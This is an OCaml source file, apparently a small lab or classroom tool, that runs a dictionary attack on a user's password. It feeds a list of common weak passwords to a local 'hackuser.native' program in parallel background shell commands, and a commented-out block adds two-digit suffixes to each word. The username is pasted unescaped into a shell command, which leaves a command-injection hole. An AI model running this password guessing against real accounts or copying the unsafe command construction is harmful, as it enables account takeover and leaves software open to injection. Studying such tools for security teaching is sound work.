let words = [|
  "airplane";
  "alphabet";
  "aviator";
  "bidirectional";
  "changeme";
  "creosote";
  "cyclone";
  "december";
  "dolphin";
  "elephant";
  "ersatz";
  "falderal";
  "functional";
  "future";
  "guitar";
  "gymnast";
  "hello";
  "imbroglio";
  "january";
  "joshua";
  "kernel";
  "kingfish";
  (* "(\\b.bb)(\\v.vv)"; *)
  "millennium";
  "monday";
  "nemesis";
  "oatmeal";
  "october";
  "paladin";
  "pass";
  "password";
  "penguin";
  "polynomial";
  "popcorn";
  "qwerty";
  "sailor";
  "swordfish";
  "symmetry";
  "system";
  "tattoo";
  "thursday";
  "tinman";
  "topography";
  "unicorn";
  "vader";
  "vampire";
  "viper";
  "warez";
  "xanadu";
  "xyzzy";
  "zephyr";
  "zeppelin";
  "zxcvbnm"
|]

let hackuser username =
  (* try each password *)
  Printf.printf "attempting hack with %d passwords\n%!" (Array.length words);
  for i = 0 to (Array.length words)-1 do
    ignore (Sys.command ("./hackuser.native -user " ^ username ^ " -pass " ^ words.(i) ^
    " >> passwords &"))
  done;
  Printf.printf "press a key when done\n%!";
  ignore (read_line ())
  (* Printf.printf "no simple matches for user %s\n" username;
  (* the above code will probably crack passwords for many useres
   * so I always try it first. when it fails, I try the more
   * expensive method below
   *
   * passwords often take the form
   *   dictwordDD
   * where DD is a two-digit decimal number. try these next: *)
  for j = 0 to 99 do
    for i = 0 to (Array.length words)-1 do
      if checkpass username (Printf.sprintf "%s%02d" words.(i) j) then begin
        Printf.printf "found match!! for user %s\npassword: %s\n" username
          words.(i);
        raise Exit
      end
    done
  done;
  Printf.printf "no matches found for user %s\n" username *)

let () =
  Arg.parse [] (fun username -> try hackuser username with Exit -> ()) "Usage:
    ./hack.exe usernames"
